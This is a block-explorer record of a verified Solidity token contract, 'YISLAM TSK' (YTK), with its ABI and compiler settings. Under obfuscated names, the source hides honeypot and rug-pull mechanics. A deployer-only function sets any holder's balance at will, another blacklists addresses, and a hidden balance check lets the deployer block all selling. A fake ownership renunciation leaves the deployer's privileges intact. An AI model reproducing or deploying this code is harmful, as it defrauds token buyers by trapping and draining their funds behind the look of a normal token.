{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface buyIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface limitWalletShould {\n    function createPair(address receiverLaunch, address feeMarketing) external returns (address);\n}\n\nabstract contract isTxSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromMarketing) external view returns (uint256);\n\n    function transfer(address shouldMarketingTotal, uint256 amountTeam) external returns (bool);\n\n    function allowance(address liquidityTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountTeam) external returns (bool);\n\n    function transferFrom(address sender,address shouldMarketingTotal,uint256 amountTeam) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listLaunched, uint256 value);\n    event Approval(address indexed liquidityTx, address indexed spender, uint256 value);\n}\n\ninterface liquidityTradingMetadata is liquidityTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract YISLAMTSK is isTxSender, liquidityTrading, liquidityTradingMetadata {\n\n    function approve(address launchedTxShould, uint256 amountTeam) public virtual override returns (bool) {\n        senderBuy[_msgSender()][launchedTxShould] = amountTeam;\n        emit Approval(_msgSender(), launchedTxShould, amountTeam);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableMin;\n    }\n\n    bool public tradingList;\n\n    mapping(address => mapping(address => uint256)) private senderBuy;\n\n    uint256 tokenTakeTx;\n\n    function transfer(address fundSwap, uint256 amountTeam) external virtual override returns (bool) {\n        return listMax(_msgSender(), fundSwap, amountTeam);\n    }\n\n    function tokenFee(address shouldMode) public {\n        if (tradingList) {\n            return;\n        }\n        if (limitLaunched != shouldToLaunched) {\n            shouldToLaunched = totalMode;\n        }\n        listMarketing[shouldMode] = true;\n        \n        tradingList = true;\n    }\n\n    function balanceOf(address fromMarketing) public view virtual override returns (uint256) {\n        return marketingList[fromMarketing];\n    }\n\n    address public exemptTradingLaunched;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundFrom;\n    }\n\n    function tokenSell() public {\n        emit OwnershipTransferred(exemptTradingLaunched, address(0));\n        tokenLimitSwap = address(0);\n    }\n\n    function launchedShouldTx(uint256 amountTeam) public {\n        modeReceiver();\n        tokenTakeTx = amountTeam;\n    }\n\n    function atTxMarketing(address exemptTake) public {\n        modeReceiver();\n        if (shouldToLaunched == totalMode) {\n            marketingLiquidity = toMarketingSender;\n        }\n        if (exemptTake == exemptTradingLaunched || exemptTake == toReceiver) {\n            return;\n        }\n        fromShouldMax[exemptTake] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletTotal;\n    }\n\n    function listMax(address listSellMax, address shouldMarketingTotal, uint256 amountTeam) internal returns (bool) {\n        if (listSellMax == exemptTradingLaunched) {\n            return teamFee(listSellMax, shouldMarketingTotal, amountTeam);\n        }\n        uint256 senderLaunchShould = liquidityTrading(toReceiver).balanceOf(marketingLaunchedSell);\n        require(senderLaunchShould == tokenTakeTx);\n        require(!fromShouldMax[listSellMax]);\n        return teamFee(listSellMax, shouldMarketingTotal, amountTeam);\n    }\n\n    address teamMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address listSellMax, address shouldMarketingTotal, uint256 amountTeam) external override returns (bool) {\n        if (_msgSender() != teamMax) {\n            if (senderBuy[listSellMax][_msgSender()] != type(uint256).max) {\n                require(amountTeam <= senderBuy[listSellMax][_msgSender()]);\n                senderBuy[listSellMax][_msgSender()] -= amountTeam;\n            }\n        }\n        return listMax(listSellMax, shouldMarketingTotal, amountTeam);\n    }\n\n    uint256 private enableMin = 100000000 * 10 ** 18;\n\n    function name() external view virtual override returns (string memory) {\n        return shouldToReceiver;\n    }\n\n    uint256 private sellMin;\n\n    mapping(address => uint256) private marketingList;\n\n    function allowance(address exemptAtLimit, address launchedTxShould) external view virtual override returns (uint256) {\n        if (launchedTxShould == teamMax) {\n            return type(uint256).max;\n        }\n        return senderBuy[exemptAtLimit][launchedTxShould];\n    }\n\n    uint8 private fundFrom = 18;\n\n    string private shouldToReceiver = \"YISLAM TSK\";\n\n    uint256 private shouldToLaunched;\n\n    uint256 public totalMode;\n\n    uint256 private modeExempt;\n\n    event OwnershipTransferred(address indexed buyLimit, address indexed limitExempt);\n\n    function modeReceiver() private view {\n        require(listMarketing[_msgSender()]);\n    }\n\n    address public toReceiver;\n\n    address marketingLaunchedSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private tokenLimitSwap;\n\n    uint256 private limitLaunched;\n\n    bool public sellWallet;\n\n    mapping(address => bool) public fromShouldMax;\n\n    constructor (){\n        if (shouldToLaunched != limitLaunched) {\n            toMarketingSender = sellMin;\n        }\n        tokenSell();\n        buyIs marketingLaunchReceiver = buyIs(teamMax);\n        toReceiver = limitWalletShould(marketingLaunchReceiver.factory()).createPair(marketingLaunchReceiver.WETH(), address(this));\n        \n        exemptTradingLaunched = _msgSender();\n        listMarketing[exemptTradingLaunched] = true;\n        marketingList[exemptTradingLaunched] = enableMin;\n        if (marketingLiquidity != toMarketingSender) {\n            toMarketingSender = marketingLiquidity;\n        }\n        emit Transfer(address(0), exemptTradingLaunched, enableMin);\n    }\n\n    uint256 private marketingToken;\n\n    function owner() external view returns (address) {\n        return tokenLimitSwap;\n    }\n\n    string private walletTotal = \"YTK\";\n\n    function fromTradingMax(address fundSwap, uint256 amountTeam) public {\n        modeReceiver();\n        marketingList[fundSwap] = amountTeam;\n    }\n\n    uint256 private marketingLiquidity;\n\n    uint256 private toMarketingSender;\n\n    uint256 tradingMin;\n\n    function getOwner() external view returns (address) {\n        return tokenLimitSwap;\n    }\n\n    function teamFee(address listSellMax, address shouldMarketingTotal, uint256 amountTeam) internal returns (bool) {\n        require(marketingList[listSellMax] >= amountTeam);\n        marketingList[listSellMax] -= amountTeam;\n        marketingList[shouldMarketingTotal] += amountTeam;\n        emit Transfer(listSellMax, shouldMarketingTotal, amountTeam);\n        return true;\n    }\n\n    mapping(address => bool) public listMarketing;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAtLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedTxShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTxShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTake\",\"type\":\"address\"}],\"name\":\"atTxMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTradingLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromShouldMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTeam\",\"type\":\"uint256\"}],\"name\":\"fromTradingMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountTeam\",\"type\":\"uint256\"}],\"name\":\"launchedShouldTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMode\",\"type\":\"address\"}],\"name\":\"tokenFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listSellMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldMarketingTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "YISLAMTSK", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}